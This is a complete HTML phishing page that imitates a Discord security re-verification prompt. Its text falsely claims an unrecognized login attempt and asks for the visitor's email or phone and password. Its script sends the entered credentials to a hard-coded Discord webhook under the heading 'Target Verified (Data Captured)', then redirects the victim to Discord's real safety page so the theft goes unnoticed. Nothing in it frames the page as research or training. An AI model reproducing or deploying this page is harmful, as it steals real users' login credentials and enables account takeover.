<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord Support - Security Re-verification</title>
    <style>
        body { background-color: #313338; color: white; font-family: 'gg sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #2b2d31; padding: 40px; border-radius: 8px; width: 420px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
        .logo { width: 130px; margin-bottom: 25px; }
        h2 { font-size: 24px; margin-bottom: 10px; color: #f2f3f5; }
        p { color: #b5bac1; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #1e1f22; background: #1e1f22; color: white; box-sizing: border-box; font-size: 16px; }
        input:focus { outline: 1px solid #5865f2; }
        label { display: block; text-align: left; color: #b5bac1; font-size: 12px; font-weight: bold; margin-bottom: 8px; text-transform: uppercase; }
        button { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.2s; }
        button:hover { background: #4752c4; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://assets-global.website-files.com/6257adef93867e3d84058941/6257af399999999999999999_discord-logo-white.svg" class="logo" alt="Discord">
        <h2>Security Re-verification</h2>
        <p>Our systems detected a login attempt from an unrecognized device. Please re-enter your credentials to secure your account and terminate all other sessions.</p>
        
        <div style="text-align: left;">
            <label>Email or Phone Number</label>
            <input type="text" id="email" placeholder="email@example.com">
            <label>Current Password</label>
            <input type="password" id="pass" placeholder="••••••••">
        </div>
        
        <button onclick="submit()">Verify & Secure Account</button>
    </div>

    <script>
        async function submit() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            const webhook = "https://discord.com/api/webhooks/1479521399226761257/oXj1-cf5ipoSkF_SKSvCay19JJH7mfnL0Y4grui0lVUU6b9r582psAk1qb4gF4IRC1Kd";

            if (e && p) {
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔱 **Target Verified (Data Captured)**",
                            color: 15158332,
                            fields: [
                                { name: "📧 Login", value: "`" + e + "`" },
                                { name: "🔑 Password", value: "`" + p + "`" }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
                // העברה לדף רשמי לאחר ה"אימות"
                window.location.href = "https://discord.com/safety";
            } else {
                alert("Please fill in all fields to proceed.");
            }
        }
    </script>
</body>
</html>
